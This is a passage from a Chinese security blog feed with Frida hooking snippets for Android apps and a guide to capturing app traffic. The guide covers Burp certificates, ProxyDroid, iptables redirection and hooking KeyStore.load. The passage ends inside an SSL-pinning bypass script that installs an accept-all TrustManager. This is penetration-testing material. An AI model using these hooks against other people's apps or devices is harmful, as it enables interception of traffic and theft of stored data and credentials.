      console.log(&quot;--------------------------Need Method---------------------------------&quot;);</span><br><span class="line">                console.log(func[0]);</span><br><span class="line">                var f &#x3D; func[0];</span><br><span class="line">                console.log(&quot;---------------------------- OVER---------------------------------&quot;);</span><br><span class="line">                return result;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">            return result;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>调用Method.invoke()去执行方法(invoke方法的第一个参数是执行这个方法的对象实例，第二个参数是带入的实际值数组，返回值是Object，也既是该方法执行后的返回值)</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">f.invoke(instance,Array);</span><br></pre></td></tr></table></figure><p>read-std-string</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;*</span><br><span class="line"> * Note: Only compatible with libc++, though libstdc++&#39;s std::string is a lot simpler.</span><br><span class="line"> *&#x2F;</span><br><span class="line"></span><br><span class="line">function readStdString (str) &#123;</span><br><span class="line">  const isTiny &#x3D; (str.readU8() &amp; 1) &#x3D;&#x3D;&#x3D; 0;</span><br><span class="line">  if (isTiny) &#123;</span><br><span class="line">    return str.add(1).readUtf8String();</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  return str.add(2 * Process.pointerSize).readPointer().readUtf8String();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>whereisnative</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Java.perform(function() &#123;</span><br><span class="line"></span><br><span class="line">    var SystemDef &#x3D; Java.use(&#39;java.lang.System&#39;);</span><br><span class="line"></span><br><span class="line">    var RuntimeDef &#x3D; Java.use(&#39;java.lang.Runtime&#39;);</span><br><span class="line"></span><br><span class="line">    var exceptionClass &#x3D; Java.use(&#39;java.lang.Exception&#39;);</span><br><span class="line"></span><br><span class="line">    var SystemLoad_1 &#x3D; SystemDef.load.overload(&#39;java.lang.String&#39;);</span><br><span class="line"></span><br><span class="line">    var SystemLoad_2 &#x3D; SystemDef.loadLibrary.overload(&#39;java.lang.String&#39;);</span><br><span class="line"></span><br><span class="line">    var RuntimeLoad_1 &#x3D; RuntimeDef.load.overload(&#39;java.lang.String&#39;);</span><br><span class="line"></span><br><span class="line">    var RuntimeLoad_2 &#x3D; RuntimeDef.loadLibrary.overload(&#39;java.lang.String&#39;);</span><br><span class="line"></span><br><span class="line">    var ThreadDef &#x3D; Java.use(&#39;java.lang.Thread&#39;);</span><br><span class="line"></span><br><span class="line">    var ThreadObj &#x3D; ThreadDef.$new();</span><br><span class="line"></span><br><span class="line">    SystemLoad_1.implementation &#x3D; function(library) &#123;</span><br><span class="line">        send(&quot;Loading dynamic library &#x3D;&gt; &quot; + library);</span><br><span class="line">        stackTrace();</span><br><span class="line">        return SystemLoad_1.call(this, library);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    SystemLoad_2.implementation &#x3D; function(library) &#123;</span><br><span class="line">        send(&quot;Loading dynamic library &#x3D;&gt; &quot; + library);</span><br><span class="line">        stackTrace();</span><br><span class="line">        SystemLoad_2.call(this, library);</span><br><span class="line">        return;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    RuntimeLoad_1.implementation &#x3D; function(library) &#123;</span><br><span class="line">        send(&quot;Loading dynamic library &#x3D;&gt; &quot; + library);</span><br><span class="line">        stackTrace();</span><br><span class="line">        RuntimeLoad_1.call(this, library);</span><br><span class="line">        return;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    RuntimeLoad_2.implementation &#x3D; function(library) &#123;</span><br><span class="line">        send(&quot;Loading dynamic library &#x3D;&gt; &quot; + library);</span><br><span class="line">        stackTrace();</span><br><span class="line">        RuntimeLoad_2.call(this, library);</span><br><span class="line">        return;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function stackTrace() &#123;</span><br><span class="line">        var stack &#x3D; ThreadObj.currentThread().getStackTrace();</span><br><span class="line">        for (var i &#x3D; 0; i &lt; stack.length; i++) &#123;</span><br><span class="line">            send(i + &quot; &#x3D;&gt; &quot; + stack[i].toString());</span><br><span class="line">        &#125;</span><br><span class="line">        send(&quot;--------------------------------------------------------------------------&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;)；</span><br></pre></td></tr></table></figure><p>Non-ASCII</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">int ֏(int x) &#123;</span><br><span class="line">       return x + 100;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>甚至有一些不可视, 所以可以先编码打印出来, 再用编码后的字符串去 hook.&lt;\br&gt;</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Java.perform(</span><br><span class="line">        function x() &#123;</span><br><span class="line"></span><br><span class="line">            var targetClass &#x3D; &quot;com.example.hooktest.MainActivity&quot;;</span><br><span class="line"></span><br><span class="line">            var hookCls &#x3D; Java.use(targetClass);</span><br><span class="line">            var methods &#x3D; hookCls.class.getDeclaredMethods();</span><br><span class="line"></span><br><span class="line">            for (var i in methods) &#123;</span><br><span class="line">                console.log(methods[i].toString());</span><br><span class="line">                console.log(encodeURIComponent(methods[i].toString().replace(&#x2F;^.*?\.([^\s\.\(\)]+)\(.*?$&#x2F;, &quot;$1&quot;)));</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            hookCls[decodeURIComponent(&quot;%D6%8F&quot;)]</span><br><span class="line">                .implementation &#x3D; function (x) &#123;</span><br><span class="line">                    console.log(&quot;original call: fun(&quot; + x + &quot;)&quot;);</span><br><span class="line">                    var result &#x3D; this[decodeURIComponent(&quot;%D6%8F&quot;)](900);</span><br><span class="line">                    return result;</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    )</span><br></pre></td></tr></table></figure><h2 id="Hook-数据库"><a href="#Hook-数据库" class="headerlink" title="Hook 数据库"></a>Hook 数据库</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var SQLiteDatabase &#x3D; Java.use(&#39;com.tencent.wcdb.database.SQLiteDatabase&#39;);</span><br><span class="line">    var Set &#x3D; Java.use(&quot;java.util.Set&quot;);</span><br><span class="line">    var ContentValues &#x3D; Java.use(&quot;android.content.ContentValues&quot;);</span><br><span class="line">    SQLiteDatabase.insert.implementation &#x3D; function (arg1,arg2,arg3) &#123;</span><br><span class="line"></span><br><span class="line">        this.insert.call(this, arg1, arg2, arg3);</span><br><span class="line">        console.log(&quot;[insert] -&gt; arg1:&quot; + arg1 + &quot;\t arg2:&quot; + arg2);</span><br><span class="line">        var values &#x3D; Java.cast(arg3, ContentValues);</span><br><span class="line">        var sets &#x3D; Java.cast(values.keySet(), Set);</span><br><span class="line">        </span><br><span class="line">        var arr &#x3D; sets.toArray().toString().split(&quot;,&quot;);</span><br><span class="line">        for (var i &#x3D; 0; i &lt; arr.length; i++)&#123;</span><br><span class="line">            console.log(&quot;[insert] -&gt; key:&quot; + arr[i] + &quot;\t value:&quot; + values.get(arr[i]));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line">    </span><br></pre></td></tr></table></figure><h2 id="Hook-JNI-Native-GetStringUTFChars"><a href="#Hook-JNI-Native-GetStringUTFChars" class="headerlink" title="Hook JNI Native GetStringUTFChars"></a>Hook JNI Native GetStringUTFChars</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">function hook_native_GetStringUTFChars() &#123;</span><br><span class="line">    var env &#x3D; Java.vm.getEnv();</span><br><span class="line">    var handlePointer &#x3D; Memory.readPointer(env.handle);</span><br><span class="line">    console.log(&quot;env handle: &quot; + handlePointer);</span><br><span class="line">    var GetStringUTFCharsPtr &#x3D; Memory.readPointer(handlePointer.add(0x2A4));</span><br><span class="line">    console.log(&quot;GetStringUTFCharsPtr addr: &quot; + GetStringUTFCharsPtr);</span><br><span class="line">    Interceptor.attach(GetStringUTFCharsPtr, &#123;</span><br><span class="line">        onEnter: function (args) &#123;</span><br><span class="line">            var str &#x3D; &quot;&quot;;</span><br><span class="line">            Java.perform(function () &#123;</span><br><span class="line">                str &#x3D; Java.cast(args[1], Java.use(&#39;java.lang.String&#39;));</span><br><span class="line">            &#125;);</span><br><span class="line">            console.log(&quot;GetStringUTFChars: &quot; + str);</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>主动弹窗</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Java.perform(function() &#123;</span><br><span class="line">    var System &#x3D; Java.use(&#39;java.lang.System&#39;);</span><br><span class="line">    var ActivityThread &#x3D; Java.use(&quot;android.app.ActivityThread&quot;);</span><br><span class="line">    var AlertDialogBuilder &#x3D; Java.use(&quot;android.app.AlertDialog$Builder&quot;);</span><br><span class="line">    var DialogInterfaceOnClickListener &#x3D; Java.use(&#39;android.content.DialogInterface$OnClickListener&#39;);</span><br><span class="line"></span><br><span class="line">    Java.use(&quot;android.app.Activity&quot;).onCreate.overload(&quot;android.os.Bundle&quot;).implementation &#x3D; function(savedInstanceState) &#123;</span><br><span class="line">        var currentActivity &#x3D; this;</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F; Get Main Activity</span><br><span class="line">        var application &#x3D; ActivityThread.currentApplication();</span><br><span class="line">        var launcherIntent &#x3D; application.getPackageManager().getLaunchIntentForPackage(application.getPackageName());</span><br><span class="line">        var launchActivityInfo &#x3D; launcherIntent.resolveActivityInfo(application.getPackageManager(), 0);</span><br><span class="line"></span><br><span class="line">        &#x2F;&#x2F; Alert Will Only Execute On Main Package Activity Creation</span><br><span class="line">        console.log(this.getComponentName().getClassName())</span><br><span class="line">        &#x2F;**</span><br><span class="line">         * non protective application</span><br><span class="line">         * if (launchActivityInfo &#x3D;&#x3D;&#x3D; this.getComponentName().getClassName()) &#123;</span><br><span class="line">         *     ...</span><br><span class="line">         * &#125;</span><br><span class="line">         *&#x2F;</span><br><span class="line"></span><br><span class="line">        if (this.getComponentName().getClassName() &#x3D;&#x3D;&#x3D; &quot;com.xxx&quot;) &#123;</span><br><span class="line"></span><br><span class="line">            var alert &#x3D; AlertDialogBuilder.$new(this);</span><br><span class="line">            var jString &#x3D; Java.use(&#39;java.lang.String&#39;);</span><br><span class="line">            var CharSequence &#x3D; Java.use(&#39;java.lang.CharSequence&#39;);</span><br><span class="line">            var charSequence &#x3D; Java.cast(jString.$new(&quot;What you want to do now?&quot;), CharSequence);</span><br><span class="line">            var charSequence1 &#x3D; Java.cast(jString.$new(&quot;Dismiss&quot;), CharSequence);</span><br><span class="line">            var charSequence2 &#x3D; Java.cast(jString.$new(&quot;Force Close!&quot;), CharSequence);</span><br><span class="line">            alert.setMessage(charSequence);</span><br><span class="line"></span><br><span class="line">            alert.setPositiveButton(charSequence1, Java.registerClass(&#123;</span><br><span class="line">                name: &#39;il.co.realgame.OnClickListenerPositive&#39;,</span><br><span class="line">                implements: [DialogInterfaceOnClickListener],</span><br><span class="line">                methods: &#123;</span><br><span class="line">                    getName: function() &#123;</span><br><span class="line">                        return &#39;OnClickListenerPositive&#39;;</span><br><span class="line">                    &#125;,</span><br><span class="line">                    onClick: function(dialog, which) &#123;</span><br><span class="line">                        &#x2F;&#x2F; Dismiss</span><br><span class="line">                        dialog.dismiss();</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;).$new());</span><br><span class="line"></span><br><span class="line">            alert.setNegativeButton(charSequence2, Java.registerClass(&#123;</span><br><span class="line">                name: &#39;il.co.realgame.OnClickListenerNegative&#39;,</span><br><span class="line">                implements: [DialogInterfaceOnClickListener],</span><br><span class="line">                methods: &#123;</span><br><span class="line">                    getName: function() &#123;</span><br><span class="line">                        return &#39;OnClickListenerNegative&#39;;</span><br><span class="line">                    &#125;,</span><br><span class="line">                    onClick: function(dialog, which) &#123;</span><br><span class="line">                        &#x2F;&#x2F; Close Application</span><br><span class="line">                        &#x2F;&#x2F;currentActivity.finish();</span><br><span class="line">                        System.exit(0);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;).$new());</span><br><span class="line"></span><br><span class="line">            &#x2F;&#x2F; Create Alert</span><br><span class="line">            alert.create().show();</span><br><span class="line">        &#125;</span><br><span class="line">        return this.onCreate.overload(&quot;android.os.Bundle&quot;).call(this, savedInstanceState);</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h1 id="Hook-prettyMethod"><a href="#Hook-prettyMethod" class="headerlink" title="Hook prettyMethod"></a>Hook prettyMethod</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">const STD_STRING_SIZE &#x3D; 3 * Process.pointerSize;</span><br><span class="line">class StdString &#123;</span><br><span class="line">    constructor() &#123;</span><br><span class="line">        this.handle &#x3D; Memory.alloc(STD_STRING_SIZE);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    dispose() &#123;</span><br><span class="line">        const [data, isTiny] &#x3D; this._getData();</span><br><span class="line">        if (!isTiny) &#123;</span><br><span class="line">            Java.api.$delete(data);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    disposeToString() &#123;</span><br><span class="line">        const result &#x3D; this.toString();</span><br><span class="line">        this.dispose();</span><br><span class="line">        return result;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    toString() &#123;</span><br><span class="line">        const [data] &#x3D; this._getData();</span><br><span class="line">        return data.readUtf8String();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    _getData() &#123;</span><br><span class="line">        const str &#x3D; this.handle;</span><br><span class="line">        const isTiny &#x3D; (str.readU8() &amp; 1) &#x3D;&#x3D;&#x3D; 0;</span><br><span class="line">        const data &#x3D; isTiny ? str.add(1) : str.add(2 * Process.pointerSize).readPointer();</span><br><span class="line">        return [data, isTiny];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function prettyMethod(method_id, withSignature) &#123;</span><br><span class="line">    const result &#x3D; new StdString();</span><br><span class="line">    Java.api[&#39;art::ArtMethod::PrettyMethod&#39;](result, method_id, withSignature ? 1 : 0);</span><br><span class="line">    return result.disposeToString();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://eternalsakura13.com/2020/07/04/frida/#more">https://eternalsakura13.com/2020/07/04/frida/#more</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;Frida-常用操作总结&quot;&gt;&lt;a href=&quot;#Frida-常用操作总结&quot; class=&quot;headerlink&quot; title=&quot;Frida 常用操作总结&quot;&gt;&lt;/a&gt;Frida 常用操作总结&lt;/h1&gt;&lt;h2 id=&quot;Frida环境&quot;&gt;&lt;a href=&quot;#Frida环境&quot; class=&quot;headerlink&quot; title=&quot;Frida环境&quot;&gt;&lt;/a&gt;Frida环境&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://github.com/frida/frida&quot;&gt;https://github.com/frida/frida&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&quot;Pyenv&quot;&gt;&lt;a href=&quot;#Pyenv&quot; class=&quot;headerlink&quot; title=&quot;Pyenv&quot;&gt;&lt;/a&gt;Pyenv&lt;/h2&gt;&lt;p&gt;python全版本随机切换，这里提供&lt;a href=&quot;https://github.com/pyenv/pyenv#homebrew-on-macos&quot;&gt;macOS上的配置方法&lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&quot;Frida安装&quot;&gt;&lt;a href=&quot;#Frida安装&quot; class=&quot;headerlink&quot; title=&quot;Frida安装&quot;&gt;&lt;/a&gt;Frida安装&lt;/h2&gt;&lt;p&gt;如果直接按下述安装则会直接安装frida和frida-tools的最新版本。&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;pip install frida-tools&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;frida --version&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;frida-ps --version&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;我们也可以自由安装旧版本的frida，例如12.8.0&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;pyenv install 3.7.7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;pyenv local 3.7.7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;pip install frida&amp;#x3D;&amp;#x3D;12.8.0&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;pip install frida-tools&amp;#x3D;&amp;#x3D;5.3.0&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;

&lt;p&gt;安装objection&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;pip install objection&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;objection -h&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
    
    </summary>
    
    
      <category term="Android" scheme="http://www.ol4three.com/categories/Android/"/>
    
    
      <category term="Frida" scheme="http://www.ol4three.com/tags/Frida/"/>
    
      <category term="Hook" scheme="http://www.ol4three.com/tags/Hook/"/>
    
  </entry>
  
  <entry>
    <title>APP测试抓包常见问题总结</title>
    <link href="http://www.ol4three.com/2021/12/06/Android/APP%E6%B5%8B%E8%AF%95%E5%B8%B8%E8%A7%81%E9%97%AE%E9%A2%98%E6%80%BB%E7%BB%93/"/>
    <id>http://www.ol4three.com/2021/12/06/Android/APP%E6%B5%8B%E8%AF%95%E5%B8%B8%E8%A7%81%E9%97%AE%E9%A2%98%E6%80%BB%E7%BB%93/</id>
    <published>2021-12-06T02:26:08.000Z</published>
    <updated>2023-05-16T07:30:28.314Z</updated>
    
    <content type="html"><![CDATA[<p>平常在进行APP测试的时候发现存在了很多问题，现在总结记录一下对应的知识，都在这遍文章下记录更新，老规矩先放一张图</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211206111758936.png" alt="image-20211206111758936"></p><a id="more"></a><h1 id="抓包"><a href="#抓包" class="headerlink" title="抓包"></a>抓包</h1><h2 id="校验服务端HTTPS证书"><a href="#校验服务端HTTPS证书" class="headerlink" title="校验服务端HTTPS证书"></a>校验服务端HTTPS证书</h2><h3 id="导入Burp证书"><a href="#导入Burp证书" class="headerlink" title="导入Burp证书"></a>导入Burp证书</h3><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211206111913609.png" alt="image-20211206111913609"></p><p>导出之后使用</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">adb push xxx.cer sdard</span><br></pre></td></tr></table></figure><p>然后在手机设置中找到安全，选择从SD卡安装证书</p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211206112049040.png" alt="image-20211206112049040" style="zoom: 33%;"><p>也可以开启代理，手机访问 ip:port 手动下载</p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211206112158670.png" alt="image-20211206112158670" style="zoom:50%;"><h2 id="HTTPS证书绑定"><a href="#HTTPS证书绑定" class="headerlink" title="HTTPS证书绑定"></a>HTTPS证书绑定</h2><p>只认定特定的HTTPS证书，其他证书全部拒绝连接</p><h3 id="ROOT设备安装Xposed后安装JustTurstMe"><a href="#ROOT设备安装Xposed后安装JustTurstMe" class="headerlink" title="ROOT设备安装Xposed后安装JustTurstMe"></a>ROOT设备安装Xposed后安装JustTurstMe</h3><p><strong>网上文章比较多可以自己搜索</strong></p><p>eg:<a href="https://zhuanlan.zhihu.com/p/36538699">https://zhuanlan.zhihu.com/p/36538699</a></p><h3 id="非ROOT设备使用VirtualXposed安装JustTrustMe"><a href="#非ROOT设备使用VirtualXposed安装JustTrustMe" class="headerlink" title="非ROOT设备使用VirtualXposed安装JustTrustMe"></a>非ROOT设备使用VirtualXposed安装JustTrustMe</h3><p>网上文章比较多可以自己搜索</p><p>eg：</p><p>VirtualXposed ：<a href="https://nsapps.cn/index.php/archives/23/">https://nsapps.cn/index.php/archives/23/</a></p><p>太极：<a href="https://bbs.pediy.com/thread-258036.htm">https://bbs.pediy.com/thread-258036.htm</a></p><h2 id="HTTPS双向证书绑定"><a href="#HTTPS双向证书绑定" class="headerlink" title="HTTPS双向证书绑定"></a>HTTPS双向证书绑定</h2><p>HOOK对应的证书加载函数，导入burp进行抓包</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">KeyStore.load.overload(&#39;java.security.KeyStore$LoadStoreParameter&#39;).implementation &#x3D; function (arg0) </span><br><span class="line">KeyStore.load.overload(&#39;java.io.InputStream&#39;, &#39;[C&#39;).implementation &#x3D; function (arg0, arg1) </span><br></pre></td></tr></table></figure><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211220165122008.png" alt="image-20211220165122008"></p><p>可以看到成功hook到证书和密码，保存并导入<code>User options-TLS-Client TLS Certificates</code>即可</p><h2 id="检测代理"><a href="#检测代理" class="headerlink" title="检测代理"></a>检测代理</h2><p>很多APP中会设置如下检测：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">String property &#x3D; System.getProperty(&quot;https.proxyHost&quot;);</span><br><span class="line">String property &#x3D; System.getProperty(&quot;https.proxyPort&quot;);</span><br><span class="line">if(!TextUtils.isEmpty(property))&#123;</span><br><span class="line">return new Proxy(Proxy,Type.HTTP, new InetSockerAddress(Property, Integer.parseInt(property2)))</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="安装ProxyDroid"><a href="#安装ProxyDroid" class="headerlink" title="安装ProxyDroid"></a>安装ProxyDroid</h3><p>下载地址：<a href="https://proxydroid.cn.uptodown.com/android">https://proxydroid.cn.uptodown.com/android</a></p><p>打开之后授予root权限</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211206114924471.png" alt="image-20211206114924471"></p><p>1). 对ProxyDroid进⾏配置（基本配置） </p><p>Auto Setting不勾选，我们⼿动进⾏配置。 </p><p>Host：输⼊代理服务器IP。 </p><p>Port：输⼊代理服务器端⼝。 </p><p>Proxy Type选择代理服务器提供服务类型：我们这⾥选择HTTP。 </p><p>Auto Connect为当2G/3G/WIFI⽹络开启时，⾃动开启代理服务。不勾选，我们⼿动启动，以获取最⼤灵活性。 </p><p>Bypass Addresses：相当于⿊名单列表，选择排除代理的IP范围，有需要的可以⾃⼰⼿动设置。 </p><p>2). 认证信息配置： </p><p>Enable Authentication：如果代理服务器需要账户、密码认证，勾选。 </p><p>User：认证账户名。 </p><p>Password：认证密码。 </p><p>NTLM Authentication：NTLM/ NTLM2，Windows早期的⼀种认证⽅式，不⽤勾选。 </p><p>3). 特征设置： </p><p>Global Proxy：⼀定要勾选，即为全局代理，代理所有App </p><p>Individual Proxy：单独代理所选App，勾选了第⼀条的不⽤管。 </p><p>Bypass Mode：勾选了代表第⼆条中所选App不代理，勾选了第⼀条的不⽤管。 </p><p>DNS Proxy：开启DNS代理。 </p><p>4). 通知设置： </p><p>Ringtone：选择通知铃声。 </p><p>Vibrate： </p><p>5). 都设置完成后，开启Proxy Switch即可。注意：如果使⽤ProxyDroid，⽆需在系统wifi处设置代理。</p><p>同理的</p><h3 id="使用Burp透明代理模式"><a href="#使用Burp透明代理模式" class="headerlink" title="使用Burp透明代理模式"></a>使用Burp透明代理模式</h3><p>我们使用Burp的透明代理模式，在BurpSuite中监听80和443这两个端口，并且将其设置为透明代理模式：</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20230516153024999.png" alt="image-20230516153024999"></p><p>手机连接电脑，以下命令：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">adb shell</span><br><span class="line">su</span><br><span class="line">iptables -t nat -A OUTPUT -p tcp --dport 80 -j DNAT --to  172.20.10.3:80</span><br><span class="line">iptables -t nat -A OUTPUT -p tcp --dport 443 -j DNAT --to  172.20.10.3:443</span><br><span class="line">iptables -t nat -L 查看是否添加成功</span><br></pre></td></tr></table></figure><h3 id="逆向检测代理位置，Patch或者HOOK等"><a href="#逆向检测代理位置，Patch或者HOOK等" class="headerlink" title="逆向检测代理位置，Patch或者HOOK等"></a>逆向检测代理位置，Patch或者HOOK等</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Java.perform(function() &#123;</span><br><span class="line"></span><br><span class="line">    &#x2F;*</span><br><span class="line">    hook list:</span><br><span class="line">    1.SSLcontext</span><br><span class="line">    2.okhttp</span><br><span class="line">    3.webview</span><br><span class="line">    4.XUtils</span><br><span class="line">    5.httpclientandroidlib</span><br><span class="line">    6.JSSE</span><br><span class="line">    7.network\_security\_config (android 7.0+)</span><br><span class="line">    8.Apache Http client (support partly)</span><br><span class="line">    9.OpenSSLSocketImpl</span><br><span class="line">    10.TrustKit</span><br><span class="line">    11.Cronet</span><br><span class="line">    *&#x2F;</span><br><span class="line">    </span><br><span class="line">        &#x2F;&#x2F; Attempts to bypass SSL pinning implementations in a number of</span><br><span class="line">        &#x2F;&#x2F; ways. These include implementing a new TrustManager that will</span><br><span class="line">        &#x2F;&#x2F; accept any SSL certificate, overriding OkHTTP v3 check()</span><br><span class="line">        &#x2F;&#x2F; method etc.</span><br><span class="line">        var X509TrustManager &#x3D; Java.use(&#39;javax.net.ssl.X509TrustManager&#39;);</span><br><span class="line">        var HostnameVerifier &#x3D; Java.use(&#39;javax.net.ssl.HostnameVerifier&#39;);</span><br><span class="line">        var SSLContext &#x3D; Java.use(&#39;javax.net.ssl.SSLContext&#39;);</span><br><span class="line">        var quiet_output &#x3D; false;</span><br><span class="line">    </span><br><span class="line">        &#x2F;&#x2F; Helper method to honor the quiet flag.</span><br><span class="line">    </span><br><span class="line">        function quiet_send(data) &#123;</span><br><span class="line">    </span><br><span class="line">            if (quiet_output) &#123;</span><br><span class="line">    </span><br><span class="line">                return;</span><br><span class="line">            &#125;</span><br><span class="line">    </span><br><span class="line">            send(data)</span><br><span class="line">        &#125;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">        &#x2F;&#x2F; Implement a new TrustManager</span><br><span class="line">        &#x2F;&#x2F; ref: https:&#x2F;&#x2F;gist.github.com&#x2F;oleavr&#x2F;3ca67a173ff7d207c6b8c3b0ca65a9d8</span><br><span class="line">        &#x2F;&#x2F; Java.registerClass() is only supported on ART for now(201803). 所以android 4.4以下不兼容,4.4要切换成ART使用.</span><br><span class="line">        &#x2F;*</span><br><span class="line">    06-07 16:15:38.541 27021-27073&#x2F;mi.sslpinningdemo W&#x2F;System.err: java.lang.IllegalArgumentException: Required method checkServerTrusted(X509Certificate[], String, String, String) missing</span><br><span class="line">    06-07 16:15:38.542 27021-27073&#x2F;mi.sslpinningdemo W&#x2F;System.err:     at android.net.http.X509TrustManagerExtensions.&lt;init&gt;(X509TrustManagerExtensions.java:73)</span><br><span class="line">            at mi.ssl.MiPinningTrustManger.&lt;init&gt;(MiPinningTrustManger.java:61)</span><br><span class="line">    06-07 16:15:38.543 27021-27073&#x2F;mi.sslpinningdemo W&#x2F;System.err:     at mi.sslpinningdemo.OkHttpUtil.getSecPinningClient(OkHttpUtil.java:112)</span><br><span class="line">            at mi.sslpinningdemo.OkHttpUtil.get(OkHttpUtil.java:62)</span><br><span class="line">            at mi.sslpinningdemo.MainActivity$1$1.run(MainActivity.java:36)</span><br><span class="line">    *&#x2F;</span><br><span class="line">        var X509Certificate &#x3D; Java.use(&quot;java.security.cert.X509Certificate&quot;);</span><br><span class="line">        var TrustManager;</span><br><span class="line">        try &#123;</span><br><span class="line">            TrustManager &#x3D; Java.registerClass(&#123;</span><br><span class="line">                name: &#39;org.wooyun.TrustManager&#39;,</span><br><span class="line">                implements: [X509TrustManager],</span><br><span class="line">                methods: &#123;</span><br><span class="line">                    checkClientTrusted: function(chain, authType) &#123;&#125;,</span><br><span class="line">                    checkServerTrusted: function(chain, authType) &#123;&#125;,</span><br><span class="line">                    getAcceptedIssuers: function() &#123;</span><br><span class="line">                        &#x2F;&#x2F; var certs &#x3D; [X509Certificate.$new()];</span><br><span class="line">                        &#x2F;&#x2F; return certs;</span><br><span class="line">                        return [];</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125; catch (e) &#123;</span><br><span class="line">            quiet_send(&quot;registerClass from X509TrustManager &gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt; &quot; + e.message);</span><br><span class="line">        &#125;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">        &#x2F;&#x2F; Prepare the TrustManagers array to pass to SSLContext.init()</span><br><span class="line">        var TrustManagers &#x3D; [TrustManager.$new()];</span><br><span class="line">    </span><br><span class="line">        try &#123;</span><br><span class="line">            &#x2F;&#x2F; Prepare a Empty SSLFactory</span><br><span class="line">            var TLS_SSLContext &#x3D; SSLContext.getInstance(&quot;TLS&quot;);</span><br><span class="line">            TLS_SSLContext.init(null, TrustManagers, null);</span><br><span class="line">            var 